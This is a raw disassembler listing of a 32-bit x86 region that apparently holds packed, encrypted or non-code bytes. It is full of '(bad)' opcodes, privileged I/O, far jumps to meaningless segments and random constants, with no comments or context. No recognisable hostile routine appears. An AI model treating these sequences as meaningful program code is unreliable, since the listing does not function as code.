  40b686:	mov    ebp,edx
  40b688:	push   eax
  40b689:	or     eax,0x6f3b9ef0
  40b68e:	pop    eax
  40b68f:	int3   
  40b690:	cmc    
  40b691:	lahf   
  40b692:	(bad)  
  40b694:	call   0x930f2b69
  40b699:	ret    0x1965
  40b69c:	inc    edi
  40b69d:	(bad)  
  40b69e:	outs   dx,BYTE PTR ds:[esi]
  40b69f:	popf   
  40b6a0:	pop    ebp
  40b6a1:	(bad)
  40b6a4:	or     esi,DWORD PTR [edi-0x39db0113]
  40b6aa:	ret    
  40b6ab:	and    dl,bl
  40b6ad:	sti    
  40b6ae:	mov    WORD PTR [edx-0x22a9d436],ss
  40b6b4:	fs das 
  40b6b6:	arpl   si,sp
  40b6b8:	mov    ecx,0xfd5082fe
  40b6bd:	fistp  QWORD PTR ds:0xf3bd405d
  40b6c3:	mov    dl,0x83
  40b6c5:	dec    ebp
  40b6c6:	test   al,0xe4
  40b6c8:	push   bp
  40b6ca:	pop    ecx
  40b6cb:	push   ebx
  40b6cc:	sub    al,ah
  40b6ce:	fisub  DWORD PTR [edx+0x16]
  40b6d1:	icebp  
  40b6d2:	xchg   ecx,eax
  40b6d3:	int3   
  40b6d4:	sbb    al,0x88
  40b6d6:	cmp    dh,bh
  40b6d8:	out    0x68,al
  40b6da:	imul   ebp,DWORD PTR [ebx+0x4b59397e],0xffffffe9
  40b6e1:	xchg   ecx,eax
  40b6e2:	add    ecx,eax
  40b6e4:	and    al,BYTE PTR [ecx-0x259ec120]
  40b6ea:	xor    DWORD PTR [edx],0x2b0564b7
  40b6f0:	out    dx,al
  40b6f1:	or     ah,BYTE PTR [ebp+esi*2+0x72a3cf11]
  40b6f8:	pop    edx
  40b6f9:	aad    0xe2
  40b6fb:	int3   
  40b6fc:	fs add esp,edx
  40b6ff:	cvtps2pd xmm0,QWORD PTR [edi]
  40b702:	ja     0x40b727
  40b704:	sbb    ebp,DWORD PTR [edi+esi*1-0x3e]
  40b708:	sbb    al,0xbd
  40b70a:	loop   0x40b6ab
  40b70c:	sub    BYTE PTR [esi+0x43e58383],cl
  40b712:	jae    0x40b6ed
  40b714:	fwait
  40b715:	adc    eax,0xeaf0a7fb
  40b71a:	fld    TBYTE PTR [ebp-0x747f5188]
  40b720:	mov    esp,0xacfcd6ec
  40b725:	loopne 0x40b752
  40b727:	je     0x40b6d7
  40b729:	push   esi
  40b72a:	call   0x1a6c24c7
  40b72f:	xchg   ecx,eax
  40b730:	je     0x40b71d
  40b732:	pop    esi
  40b733:	ds popf 
  40b735:	dec    edi
  40b736:	cld    
  40b737:	(bad)  
  40b738:	lock cmp eax,0xf1f3591c
  40b73e:	iret   
  40b73f:	in     eax,0x3f
  40b741:	jmp    0x40b769
  40b743:	stos   BYTE PTR es:[edi],al
  40b744:	or     ch,al
  40b746:	xor    ecx,esp
  40b748:	and    ch,BYTE PTR [edx+0x5f06bb3c]
  40b74e:	adc    al,BYTE PTR [edx-0x55]
  40b751:	and    esp,ebx
  40b753:	imul   ecx,DWORD PTR [edx-0x2e],0xffffffa2
  40b757:	call   0x41c5:0x9837fd33
  40b75e:	data16 fiadd WORD PTR [ebp+0x29]
  40b762:	loop   0x40b780
  40b764:	in     al,0x9a
  40b766:	js     0x40b78e
  40b768:	int    0xce
  40b76a:	push   esp
  40b76b:	pop    eax
  40b76c:	into   
  40b76d:	dec    ebx
  40b76e:	fstp   QWORD PTR [esi+ecx*1+0x10]
  40b772:	add    bl,BYTE PTR [ebx]
  40b774:	cmp    ebp,DWORD PTR [esi+0x68]
  40b777:	jl     0x40b77a
  40b779:	cmp    al,0x81
  40b77b:	popa   
  40b77c:	or     DWORD PTR [edi],esi
  40b77e:	outs   dx,DWORD PTR ds:[esi]
  40b77f:	daa    
  40b780:	push   ebx
  40b781:	dec    esi
  40b782:	call   0xea9b0f41
  40b787:	adc    bh,BYTE PTR [edx+0x4f]
  40b78a:	not    edx
  40b78c:	mov    ecx,0xa973228e
  40b791:	mov    ecx,ecx
  40b793:	(bad)  
  40b794:	pop    esp
  40b795:	jmp    0x40b765
  40b797:	mov    esi,DWORD PTR [eax-0x38e1a27d]
  40b79d:	cmp    eax,DWORD PTR [esi]
  40b79f:	mov    edx,0x65018a8
  40b7a4:	jle    0x40b743
  40b7a6:	xor    BYTE PTR [ebx+0x1d],bl
  40b7a9:	cmp    BYTE PTR [esi+0x66c5ee27],al
  40b7af:	mov    bl,0x43
  40b7b1:	fisub  WORD PTR [edx-0xb28c0fa]
  40b7b7:	ret    0xc5d3
  40b7ba:	inc    ebp
  40b7bb:	repnz bound edi,QWORD PTR [ecx+0x55]
  40b7bf:	ds cli 
  40b7c1:	add    cl,cl
  40b7c3:	xchg   esp,eax
  40b7c4:	xor    dh,BYTE PTR [ecx]
  40b7c6:	push   ss
  40b7c7:	ins    BYTE PTR es:[di],dx
  40b7c9:	aaa    
  40b7ca:	or     al,ah
  40b7cc:	jl     0x40b7c4
  40b7ce:	xchg   ebp,eax
  40b7cf:	sbb    eax,DWORD PTR [ecx]
  40b7d1:	and    ah,BYTE PTR [esi-0x51eb46c8]
  40b7d7:	xchg   ecx,ecx
  40b7d9:	and    eax,0x40bf7489
  40b7de:	or     al,0xcd
  40b7e0:	pop    esp
  40b7e1:	call   0x2aa32e1e
  40b7e6:	stos   DWORD PTR es:[edi],eax
  40b7e7:	cwde   
  40b7e8:	pop    es
  40b7e9:	or     al,0x63
  40b7eb:	jno    0x40b7e7
  40b7ed:	dec    ebx
  40b7ee:	mov    cl,0x52
  40b7f0:	popa   
  40b7f1:	retf   
  40b7f2:	sahf   
  40b7f3:	repnz dec ebp
  40b7f5:	xor    eax,0xee9d0689
  40b7fa:	jno    0x40b7c7
  40b7fc:	or     eax,DWORD PTR [ebx-0x477e9821]
  40b802:	mov    esi,0x186ad88d
  40b807:	add    edx,DWORD PTR ds:0xad661a43
  40b80d:	mov    eax,0x19dc15d8
  40b812:	sbb    esp,0x21
  40b815:	in     al,dx
  40b816:	mov    bh,0xcf
  40b818:	inc    esi
  40b819:	mov    DWORD PTR [esp+edx*8],ecx
  40b81c:	or     esp,ecx
  40b81e:	sar    BYTE PTR [edx+0x2c9acbed],cl
  40b824:	nop
  40b825:	lock xchg esp,eax
  40b827:	(bad)  
  40b828:	cmovg  eax,DWORD PTR [ecx-0x469e6a97]
  40b82f:	in     eax,dx
  40b830:	and    edi,esp
  40b832:	lods   eax,DWORD PTR ds:[esi]
  40b833:	lock inc edx
  40b835:	call   0x1919:0x7f808c6f
  40b83c:	adc    cl,BYTE PTR [esi-0x36]
  40b83f:	xor    dh,ch
  40b841:	cmp    DWORD PTR [ebx],ebx
  40b843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b844:	mov    ebx,DWORD PTR ds:0x6bfad7f3
  40b84a:	pop    eax
  40b84b:	push   ecx
  40b84c:	leave  
  40b84d:	ror    BYTE PTR [eax],1
  40b84f:	push   ebp
  40b850:	and    BYTE PTR [esi+0x88a305a],al
  40b856:	lahf   
  40b857:	pushf  
  40b858:	add    BYTE PTR [ecx+ebp*8],dh
  40b85b:	mov    bl,0x4a
  40b85d:	push   0xffffffa1
  40b85f:	shl    DWORD PTR [ebx],cl
  40b861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b862:	repnz xor esi,DWORD PTR [esi-0x41]
  40b866:	and    ebx,DWORD PTR [edx-0x2d]
  40b869:	jg     0x40b8b7
  40b86b:	sub    esp,eax
  40b86d:	mov    BYTE PTR [edx+0x4b],ah
  40b870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b871:	sub    eax,0x12c85304
  40b876:	push   edi
  40b877:	sbb    eax,ebx
  40b879:	retf   
  40b87a:	ror    ebp,cl
  40b87c:	mov    ah,0xa
  40b87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b87f:	bound  edx,QWORD PTR [ebx]
  40b881:	ds test al,0xf0
  40b884:	sti    
  40b885:	es scas al,BYTE PTR es:[edi]
  40b887:	in     eax,0x34
  40b889:	test   BYTE PTR ds:0xcb98f141,0x7b
  40b890:	daa    
  40b891:	loopne 0x40b880
  40b893:	mov    edx,0x8945a151
  40b898:	pop    esi
  40b899:	dec    esp
  40b89a:	jge    0x40b8c6
  40b89c:	popa   
  40b89d:	in     eax,dx
  40b89e:	mov    ebp,0x881a0f04
  40b8a3:	sahf   
  40b8a4:	push   ds
  40b8a5:	mov    ah,0xa1
  40b8a7:	or     dl,BYTE PTR [ebp-0x73]
  40b8aa:	fcomp  QWORD PTR [edi+0x6e]
  40b8ad:	inc    esp
  40b8ae:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40b8b0:	paddw  mm6,QWORD PTR [ecx+ebp*1]
  40b8b4:	xchg   edx,eax
  40b8b5:	pop    ebx
  40b8b6:	inc    ebp
  40b8b7:	add    dh,BYTE PTR [edi+0x4a]
  40b8ba:	adc    bh,BYTE PTR [ebx]
  40b8bc:	push   0x79eb52a9
  40b8c1:	xor    al,ch
  40b8c3:	sbb    eax,0xd7d0edc9
  40b8c8:	fs pop es
  40b8ca:	mov    DWORD PTR [ebx],ecx
  40b8cc:	dec    esp
  40b8cd:	gs loopne 0x40b8b6
  40b8d0:	add    eax,DWORD PTR [edi+0x4044a0ee]
  40b8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d7:	mov    BYTE PTR [ebp-0x74],bh
  40b8da:	(bad)  
  40b8db:	fstp   TBYTE PTR [ecx-0x16f6f45a]
  40b8e1:	(bad)  
  40b8e2:	std    
  40b8e3:	stos   DWORD PTR es:[edi],eax
  40b8e4:	mov    ebx,0xa4df3f4a
  40b8e9:	jge    0x40b949
  40b8eb:	bound  esi,QWORD PTR [edi+0x4d2eae1c]
  40b8f1:	cs mov al,0xd8
  40b8f4:	daa    
  40b8f5:	rcl    BYTE PTR [ebx+0x22d9f973],0x1f
  40b8fc:	xchg   BYTE PTR [eax+0x50],ch
  40b8ff:	sbb    BYTE PTR [ecx],al
  40b901:	adc    al,0xf4
  40b903:	mul    dh
  40b905:	addr16 repnz (bad) 
  40b908:	mov    WORD PTR [esi+0x5ba5e0b7],?
  40b90e:	test   eax,0x21645794
  40b913:	mov    ebp,0xcaadd1a
  40b918:	jmp    0x40b935
  40b91a:	repnz xchg ebx,eax
  40b91c:	mov    ds:0x988dfb1b,al
  40b921:	rcr    BYTE PTR [eax+0x6821f276],0xdb
  40b928:	stos   DWORD PTR es:[edi],eax
  40b929:	jae    0x40b8b3
  40b92b:	retf   0x5923
  40b92e:	jl     0x40b92f
  40b930:	pop    ebp
  40b931:	push   0x21
  40b933:	xlat   BYTE PTR ds:[ebx]
  40b934:	pop    es
  40b935:	pop    ss
  40b936:	pop    ds
  40b937:	dec    DWORD PTR [ebx+edx*2+0x6]
  40b93b:	inc    esi
  40b93c:	in     al,dx
  40b93d:	jmp    0xc114:0xa7a30ec7
  40b944:	push   ebp
  40b945:	push   ss
  40b946:	fidiv  WORD PTR cs:[edx+0x3ee69af3]
  40b94d:	ret    0xdc7f
  40b950:	es or  eax,0xb0568f25
  40b956:	xchg   ecx,eax
  40b957:	in     al,0xf6
  40b959:	in     eax,dx
  40b95a:	cmp    al,0x3b
  40b95c:	mov    bh,0x67
  40b95e:	dec    edx
  40b95f:	stos   BYTE PTR es:[edi],al
  40b960:	and    al,0xc4
  40b962:	cmp    BYTE PTR [esi],0x1
  40b965:	adc    ch,BYTE PTR [ebp+0x5e37c844]
  40b96b:	or     DWORD PTR [ecx-0x2dcbe6a6],ecx
  40b971:	pop    es
  40b972:	mov    edx,0x59f72fc6
  40b977:	mov    esp,esp
  40b979:	dec    ebp
  40b97a:	xor    dh,BYTE PTR [eax-0xf88434e]
  40b980:	aaa    
  40b981:	fild   WORD PTR [bx-0x3e]
  40b985:	les    edi,FWORD PTR [edi]
  40b987:	jp     0x40b9b3
  40b989:	ret    0x6f6e
  40b98c:	mov    ds:0xc55746cd,eax
  40b991:	loopne 0x40b971
  40b993:	xor    ebp,DWORD PTR [edi-0x64]
  40b996:	sti    
  40b997:	pop    eax
  40b998:	div    al
  40b99a:	outs   dx,BYTE PTR ds:[esi]
  40b99b:	rcl    BYTE PTR [edx-0x78],0x5c
  40b99f:	jbe    0x40b965
  40b9a1:	aaa    
  40b9a2:	mov    edx,esp
  40b9a4:	xor    al,0x26
  40b9a6:	inc    esi
  40b9a7:	mov    WORD PTR [ebp-0x24],ds
  40b9aa:	in     al,dx
  40b9ab:	dec    eax
  40b9ac:	adc    bl,BYTE PTR [ecx+edx*2]
  40b9af:	or     dh,BYTE PTR [ebx+0x30]
  40b9b2:	dec    edx
  40b9b3:	sbb    BYTE PTR [edi+eiz*4],dl
  40b9b6:	je     0x40ba18
  40b9b8:	test   ecx,eax
  40b9ba:	cs push esi
  40b9bc:	mov    eax,DWORD PTR [ecx-0x3e]
  40b9bf:	jl     0x40b9d3
  40b9c1:	fisub  WORD PTR [ebx+0x59]
  40b9c4:	lods   eax,DWORD PTR ds:[esi]
  40b9c5:	jg     0x40b950
  40b9c7:	fsubp  st(6),st
  40b9c9:	inc    edi
  40b9ca:	add    BYTE PTR [ebx],0x57
  40b9cd:	push   0xd9f249f4
  40b9d2:	test   cl,cl
  40b9d4:	mov    al,0xcc
  40b9d6:	outs   dx,BYTE PTR ds:[esi]
  40b9d7:	sub    bh,BYTE PTR es:[eax+0xc]
  40b9db:	retf   
  40b9dc:	mov    WORD PTR [eax+0x13],gs
  40b9df:	sbb    esi,DWORD PTR [esi-0x15b3ce1c]
  40b9e5:	(bad)  
  40b9e7:	fwait
  40b9e8:	mov    ds:0x584d07a0,al
  40b9ed:	push   edx
  40b9ee:	call   0xf5c4:0x1774de68
  40b9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9f6:	(bad)  
  40b9f7:	pop    ds
  40b9f8:	pop    ecx
  40b9fa:	xor    DWORD PTR [ebx-0x19935042],ebx
  40ba00:	je     0x40ba71
  40ba02:	aaa    
  40ba03:	daa    
  40ba04:	or     bh,BYTE PTR [ebx+0x29]
  40ba07:	call   0x7a2a:0x3181f23d
  40ba0e:	ds push esi
  40ba10:	ds stc 
  40ba12:	in     al,0x0
  40ba14:	xor    esi,ebp
  40ba16:	in     eax,dx
  40ba17:	pop    esi
  40ba18:	jae    0x40ba4a
  40ba1a:	(bad)  
  40ba1b:	xchg   edx,eax
  40ba1c:	and    eax,0x84ed0c91
  40ba21:	(bad)  
  40ba22:	fs mov dl,0xb0
  40ba25:	sbb    bl,BYTE PTR [edi+0x5a65e2c2]
  40ba2b:	out    0x25,al
  40ba2d:	imul   eax,DWORD PTR [edi+0x14],0xffffffe6
  40ba31:	or     al,0xfd
  40ba33:	mov    eax,0xd4604b2f
  40ba38:	ret    0x3fa
  40ba3b:	bound  ebp,QWORD PTR [esi]
  40ba3d:	ss xchg esi,eax
  40ba3f:	xor    eax,esp
  40ba41:	pop    esp
  40ba42:	imul   ebp,DWORD PTR [edx+edi*8+0x1],0x1419458e
  40ba4a:	fucomip st,st(0)
  40ba4c:	out    0x7d,eax
  40ba4e:	(bad)  
  40ba4f:	scas   eax,DWORD PTR es:[edi]
  40ba50:	ror    DWORD PTR [edx+esi*4+0x17],cl
  40ba54:	sub    ah,bh
  40ba56:	cwde   
  40ba57:	cld    
  40ba58:	xor    edx,esi
  40ba5a:	lahf   
  40ba5b:	push   ebx
  40ba5c:	pop    esi
  40ba5d:	sbb    dl,BYTE PTR ds:0x9bbe5f36
  40ba63:	add    DWORD PTR [edx+0x5d],edx
  40ba66:	dec    edx
  40ba67:	icebp  
  40ba68:	mov    gs,WORD PTR [ebx]
  40ba6a:	out    dx,eax
  40ba6b:	xchg   esi,eax
  40ba6c:	(bad)  
  40ba6d:	out    dx,al
  40ba6e:	cs mov edx,0x5a1f7d8
  40ba74:	add    bl,BYTE PTR [esi]
  40ba76:	sahf   
  40ba77:	cmc    
  40ba78:	or     DWORD PTR [eax-0x5b],ecx
  40ba7b:	xor    dh,bl
  40ba7d:	rcl    DWORD PTR [edx],cl
  40ba7f:	pop    ss
  40ba80:	cmp    edx,DWORD PTR [esi+eax*1+0x39]
  40ba84:	test   eax,0x3cecac83
  40ba89:	add    DWORD PTR [edi+0x6e33e96],ebp
  40ba8f:	inc    edi
  40ba90:	retf   0xad49
  40ba93:	jg     0x40ba6d
  40ba95:	pop    ecx
  40ba96:	mov    ebx,0xc1377e84
  40ba9b:	das    
  40ba9c:	scas   eax,DWORD PTR es:[edi]
  40ba9d:	popf   
  40ba9e:	and    al,0xfc
  40baa0:	jne    0x40bb08
  40baa2:	sahf   
  40baa3:	leave  
  40baa4:	sub    al,0x77
  40baa6:	mov    ah,0x27
  40baa8:	dec    ebp
  40baa9:	adc    DWORD PTR [bp+di+0x4ef2],ebp
  40baae:	data16 arpl cx,bx
  40bab1:	inc    ebp
  40bab2:	adc    BYTE PTR [edx-0x5ec6187a],cl
  40bab8:	xchg   ebp,eax
  40bab9:	pop    es
  40baba:	std    
  40babb:	jle    0x40bb39
  40babd:	and    eax,0xa8ca8f9d
  40bac2:	mov    dl,0x9e
  40bac4:	(bad)  
  40bac5:	fadd   DWORD PTR [ebx-0x74]
  40bac8:	jo     0x40bb37
  40baca:	(bad)  
  40bacb:	fstp   QWORD PTR [edx-0x45]
  40bace:	gs ins DWORD PTR es:[edi],dx
  40bad0:	std    
  40bad1:	ss jecxz 0x40ba7c
  40bad4:	add    bh,bh
  40bad6:	push   0x31
  40bad8:	aam    0xbe
  40bada:	cmp    bh,BYTE PTR ds:0x2e04c778
  40bae0:	in     al,dx
  40bae1:	lods   eax,DWORD PTR ds:[esi]
  40bae2:	cmp    ah,dh
  40bae4:	dec    edx
  40bae5:	dec    edi
  40bae6:	xchg   edx,eax
  40bae7:	dec    ecx
  40bae8:	fnsave [ecx-0x5318160c]
  40baee:	fisubr DWORD PTR [ecx]
  40baf0:	push   eax
  40baf1:	ja     0x40bad8
  40baf3:	xchg   ebx,eax
  40baf4:	(bad)  
  40baf5:	and    al,0xdc
  40baf7:	sub    DWORD PTR [edx+0x6b],ebp
  40bafa:	mov    bh,BYTE PTR [ebx+0x3ff8d48a]
  40bb00:	out    0xd2,eax
  40bb02:	push   cs
  40bb03:	mov    ch,0xdf
  40bb05:	mov    ebp,0xe93e74c4
  40bb0a:	stc    
  40bb0b:	dec    esi
  40bb0c:	scas   al,BYTE PTR es:[edi]
  40bb0d:	inc    edx
  40bb0e:	sub    cl,BYTE PTR [ebp+0x6c]
  40bb11:	nop
  40bb12:	and    al,bl
  40bb14:	test   al,0xe1
  40bb16:	inc    ecx
  40bb17:	jg     0x40bb57
  40bb19:	push   edi
  40bb1a:	and    DWORD PTR [ecx-0x2f],eax
  40bb1d:	outs   dx,DWORD PTR ds:[esi]
  40bb1e:	inc    esi
  40bb1f:	jbe    0x40bae2
  40bb21:	add    ah,BYTE PTR [ebp-0x49ed7237]
  40bb27:	ja     0x40bb8c
  40bb29:	das    
  40bb2a:	(bad)  
  40bb2b:	and    DWORD PTR [esi+0x335fc852],ebp
  40bb31:	adc    eax,0xba02a70a
  40bb36:	inc    edi
  40bb37:	push   ecx
  40bb38:	sbb    BYTE PTR [esi-0xb2d2daf],bl
  40bb3e:	adc    edi,DWORD PTR [eax-0x1276e261]
  40bb44:	cmp    al,0x64
  40bb46:	push   ebx
  40bb47:	(bad)
  40bb4b:	out    0x1b,eax
  40bb4d:	out    dx,al
  40bb4e:	or     DWORD PTR [ecx+0x2e],ebx
  40bb51:	fst    DWORD PTR [edx+ebx*2]
  40bb54:	xchg   DWORD PTR ds:0x6e194fd5,edi
  40bb5a:	xchg   ecx,eax
  40bb5b:	adc    al,0xa
  40bb5d:	cmp    al,0x42
  40bb5f:	mov    bh,0x1e
  40bb61:	push   0xbdd4b051
  40bb66:	nop
  40bb67:	add    BYTE PTR [esp+eax*2+0x3],bl
  40bb6b:	fwait
  40bb6c:	mov    esp,0x37c5b0d1
  40bb71:	das    
  40bb72:	or     eax,ebp
  40bb74:	bound  ecx,QWORD PTR [edx+0x20]
  40bb77:	fxch   st(3)
  40bb79:	sub    esp,DWORD PTR [esi-0x70]
  40bb7c:	fadd   QWORD PTR [ebp+0x22c01a1b]
  40bb82:	repz jl 0x40bb71
  40bb85:	int    0xb0
  40bb87:	xchg   edx,eax
  40bb88:	cmp    ebp,DWORD PTR [ebp-0x55]
  40bb8b:	and    DWORD PTR [ecx+0x1f],0xc3462909
  40bb92:	jge    0x40bb86
  40bb94:	fwait
  40bb95:	popa   
  40bb96:	sub    eax,0x79912d85
  40bb9b:	sti    
  40bb9c:	loope  0x40bba4
  40bb9e:	scas   eax,DWORD PTR es:[edi]
  40bb9f:	es scas eax,DWORD PTR es:[edi]
  40bba1:	jae    0x40bb52
  40bba3:	sbb    ebp,ebx
  40bba5:	push   cs
  40bba6:	mov    eax,ds:0x20cdf413
  40bbab:	shl    al,cl
  40bbad:	mov    dh,0x9a
  40bbaf:	add    DWORD PTR [ecx+0x16c0d7c1],0xb71627de
  40bbb9:	mov    esp,edx
  40bbbb:	retf   0xad9c
  40bbbe:	js     0x40bbaf
  40bbc0:	repnz add al,0xcb
  40bbc3:	or     DWORD PTR [eax+eiz*8-0x12945da5],ebx
  40bbca:	lods   eax,DWORD PTR ds:[esi]
  40bbcb:	push   cs
  40bbcc:	mov    ch,0xc3
  40bbce:	loopne 0x40bb97
  40bbd0:	mov    ds:0x6a36e561,al
  40bbd5:	test   al,0x4d
  40bbd7:	fwait
  40bbd8:	pop    edx
  40bbd9:	aaa    
  40bbda:	cmp    ch,BYTE PTR [ebp+0x34]
  40bbdd:	add    dl,BYTE PTR [edi+0x35431ddd]
  40bbe3:	shr    DWORD PTR ds:0x129b2730,0x64
  40bbea:	mov    WORD PTR [edx+0x70],?
  40bbed:	adc    bh,BYTE PTR [edx-0x29]
  40bbf0:	sub    eax,0xc9c18e23
  40bbf5:	test   al,0x18
  40bbf7:	cmc    
  40bbf8:	push   ds
  40bbf9:	scas   al,BYTE PTR es:[edi]
  40bbfa:	mov    esp,edx
  40bbfc:	mov    ebp,0x1d297dbf
  40bc01:	ss rol bh,0xce
  40bc05:	mov    ebx,0x34f0cf7a
  40bc0a:	xchg   esi,eax
  40bc0b:	or     ch,BYTE PTR [ebx]
  40bc0d:	call   0x54e1df7
  40bc12:	ja     0x40bc24
  40bc14:	retf   0xac6c
  40bc17:	ds pop edx
  40bc19:	repz js 0x40bba2
  40bc1c:	dec    edx
  40bc1d:	pop    ecx
  40bc1e:	mov    edi,0x3c424426
  40bc23:	xchg   esi,eax
  40bc24:	imul   ecx,DWORD PTR [ecx-0x3092a793],0x80c7a567
  40bc2e:	sbb    DWORD PTR [edi+eax*8-0x1938efd3],ebp
  40bc35:	stc    
  40bc36:	sbb    esi,DWORD PTR [eax-0x65164336]
  40bc3c:	cdq    
  40bc3d:	stc    
  40bc3e:	sbb    eax,0x52f63cab
  40bc43:	lods   eax,DWORD PTR ds:[esi]
  40bc44:	mov    dh,0x64
  40bc46:	add    DWORD PTR [edx-0x9],esp
  40bc49:	das    
  40bc4a:	push   0x856b51b5
  40bc4f:	cmp    DWORD PTR [ebx-0x42],0xffffff86
  40bc53:	mov    ch,0x48
  40bc55:	shl    ebx,0xab
  40bc58:	xchg   edi,eax
  40bc59:	jb     0x40bbf9
  40bc5b:	mov    ebp,DWORD PTR [ecx]
  40bc5d:	retf   
  40bc5e:	push   0x7cd4153d
  40bc63:	mov    edx,0x70bdf819
  40bc68:	test   al,0xd3
  40bc6b:	push   ss
  40bc6c:	sti    
  40bc6d:	rol    BYTE PTR [ebp+0x11],1
  40bc70:	and    DWORD PTR [esi+0x76218bb9],edx
  40bc76:	nop    DWORD PTR [edx-0x659c95d9]
  40bc7d:	mov    dl,0x84
  40bc7f:	imul   edi,DWORD PTR [ecx+0x28338490],0xe49f4661
  40bc89:	fadd   DWORD PTR ss:[edx+0x4f]
  40bc8d:	pop    eax
  40bc8e:	pop    edx
  40bc8f:	and    BYTE PTR ds:0xcddfa8de,al
  40bc95:	push   esp
  40bc96:	(bad)  
  40bc97:	aam    0x82
  40bc99:	mov    ds:0x0,al
	...
  40bd12:	add    BYTE PTR [eax],al
  40bd14:	pop    edx
  40bd15:	in     al,0xf9
  40bd17:	(bad)  
  40bd18:	(bad)  
  40bd19:	fnstsw WORD PTR [edi-0x2]
  40bd1c:	or     eax,0xde4271cc
  40bd21:	pop    ds
  40bd22:	retf   
  40bd23:	(bad)  
  40bd24:	mov    ds:0x6e00006d,eax
  40bd29:	pop    es
  40bd2a:	add    BYTE PTR [eax],al
  40bd2c:	push   eax
  40bd2d:	inc    esp
  40bd2e:	and    DWORD PTR [edi],ebp
  40bd30:	fwait
  40bd31:	adc    DWORD PTR [edx],ebp
  40bd33:	js     0x40bd1a
  40bd35:	pop    edi
  40bd36:	jl     0x40bd58
  40bd38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd39:	rol    DWORD PTR [esi],0xa7
  40bd3c:	xor    al,0x26
  40bd3e:	jmp    0xf26e0e15
  40bd43:	popf   
  40bd44:	mov    ebp,0xef42d132
  40bd49:	and    bh,BYTE PTR gs:[edi]
  40bd4c:	mov    eax,DWORD PTR [edx+0x79]
  40bd4f:	popf   
  40bd50:	and    BYTE PTR gs:[ebx+0x4d67aeb],ch
  40bd57:	inc    edx
  40bd58:	xor    eax,0x7513623d
  40bd5d:	shl    DWORD PTR [edx-0x6ff7629a],1
  40bd63:	add    al,0x5a
  40bd65:	repz popa 
  40bd67:	mov    eax,ds:0xe961dd90
  40bd6c:	dec    ebx
  40bd6d:	repnz dec edi
  40bd6f:	mov    ch,0xc0
  40bd71:	call   0x571fd060
  40bd76:	rol    BYTE PTR [edx+0x2e256d2f],1
  40bd7c:	mov    eax,ds:0xa7962b8e
  40bd81:	(bad)  [esi-0x29]
  40bd84:	(bad)
  40bd88:	sbb    al,ah
  40bd8a:	and    DWORD PTR [edx+0x4],ecx
  40bd8d:	jno    0x40bd2f
  40bd8f:	int3   
  40bd90:	retf   
  40bd91:	test   eax,0xa9ec9dba
  40bd96:	dec    eax
  40bd97:	cli    
  40bd98:	mov    WORD PTR [edx-0x37],ds
  40bd9b:	fistp  WORD PTR [eax]
  40bd9d:	sbb    ch,BYTE PTR [eax]
  40bd9f:	inc    ebp
  40bda0:	arpl   si,bp
  40bda2:	mov    eax,0xabed6404
  40bda7:	lahf   
  40bda8:	dec    ecx
  40bda9:	popf   
  40bdaa:	scas   eax,DWORD PTR es:[edi]
  40bdab:	mov    edx,DWORD PTR [ecx-0x9]
  40bdae:	sbb    eax,0xbb8b39d
  40bdb3:	inc    ebx
  40bdb4:	dec    edx
  40bdb5:	cwde   
  40bdb6:	pop    ecx
  40bdb7:	cwde   
  40bdb8:	xor    ecx,DWORD PTR [edi-0x3da49974]
  40bdbe:	test   al,0x85
  40bdc0:	and    al,0x2c
  40bdc2:	out    dx,al
  40bdc3:	test   BYTE PTR [ecx+esi*1+0x3e42bc],0xcd
  40bdcb:	ins    DWORD PTR es:[edi],dx
  40bdcc:	cmp    bl,BYTE PTR [esi-0x1f]
  40bdcf:	push   ss
  40bdd0:	ins    DWORD PTR es:[edi],dx
  40bdd1:	cdq    
  40bdd2:	cmp    ebx,DWORD PTR [edi+ebp*4+0x60eb27e5]
  40bdd9:	in     al,0x67
  40bddb:	jne    0x40be2b
  40bddd:	es test eax,0xfd0953d4
  40bde3:	add    DWORD PTR [edi-0x2fab528],esp
  40bde9:	fsub   st(3),st
  40bdeb:	jo     0x40be3d
  40bded:	cli    
  40bdee:	outs   dx,BYTE PTR ds:[esi]
  40bdef:	jmp    0x40be70
  40bdf1:	sbb    DWORD PTR [ecx],ebp
  40bdf3:	and    al,0xcd
  40bdf5:	jle    0x40be30
  40bdf7:	pop    ebp
  40bdf8:	out    dx,al
  40bdf9:	push   ebx
  40bdfa:	cmp    DWORD PTR [esi],ecx
  40bdfc:	aas    
  40bdfd:	mov    ebp,0x92cb6178
  40be02:	xor    DWORD PTR ds:0xb6fa3532,edi
  40be08:	lods   al,BYTE PTR ds:[esi]
  40be09:	xchg   ecx,eax
  40be0a:	or     DWORD PTR [esp+eiz*2],esp
  40be0d:	scas   eax,DWORD PTR es:[edi]
  40be0e:	mov    ecx,0x31043e85
  40be13:	mov    DWORD PTR [eax-0x2a229a34],eax
  40be19:	ss push esi
  40be1b:	adc    ah,BYTE PTR [ebx-0x24]
  40be1e:	ja     0x40be90
  40be20:	xor    dh,BYTE PTR [ebx+0x66fff03c]
  40be26:	xor    BYTE PTR [ecx-0x16],0x52
  40be2a:	mov    ds:0xa68b5cb9,eax
  40be2f:	test   BYTE PTR [eax+0x45e07f9a],al
  40be35:	lods   eax,DWORD PTR ds:[esi]
  40be36:	jb     0x40be48
  40be38:	jge    0x40be40
  40be3a:	or     al,0x41
  40be3c:	jmp    0x11eb:0xf695c68a
  40be43:	push   eax
  40be44:	aam    0xe7
  40be46:	mov    ebp,0x9ec32ff9
  40be4b:	sbb    al,0xf3
  40be4d:	xchg   BYTE PTR [esi+0x10],al
  40be50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be51:	or     ebx,DWORD PTR [ebp+0x5b]
  40be54:	orps   xmm4,XMMWORD PTR [ebp+0x2904ee61]
  40be5b:	push   ds
  40be5c:	cmp    DWORD PTR [edi-0x4f],0x1
  40be60:	in     eax,dx
  40be61:	loope  0x40bdf7
  40be63:	pop    es
  40be64:	mov    ch,0x3e
  40be66:	xchg   edx,eax
  40be67:	rcr    BYTE PTR [edi+0x6e659173],1
  40be6d:	in     al,0x41
  40be6f:	push   0x61d1e3c2
